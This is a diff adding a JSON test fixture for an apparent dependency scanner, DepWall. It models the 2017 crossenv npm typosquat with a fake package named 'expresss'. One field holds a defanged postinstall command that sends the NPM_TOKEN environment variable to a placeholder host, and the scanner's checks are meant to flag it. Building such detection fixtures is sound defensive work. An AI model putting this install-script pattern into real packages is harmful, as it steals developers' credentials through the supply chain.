@@ -1,0 +1,15 @@
+{
+  "_incident": "crossenv / cross-env typosquat wave (Aug 2017)",
+  "_disclosure": "https://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry",
+  "_note": "An attacker published typosquats of popular packages (crossenv ~ cross-env) whose postinstall exfiltrated environment variables. Here modelled as a name one edit-distance from a real popular package so the deterministic slopsquat signal fires; the exfil postinstall shape is also present (defanged), so install-scripts fires critical too, and being new+low-adoption also raises maturity:warn. Anchor name `expresss` is dist-1 from the real popular `express` in DepWall's dictionary.",
+  "name": "expresss",
+  "version": "1.0.0",
+  "ageDays": 3,
+  "weeklyDownloads": 12,
+  "hasInstallScripts": true,
+  "installScriptBodies": [
+    "node -e \"require('https').get('https://REDACTED.example/?e='+process.env.NPM_TOKEN)\""
+  ],
+  "maintainerCount": 1,
+  "deprecated": false
+}
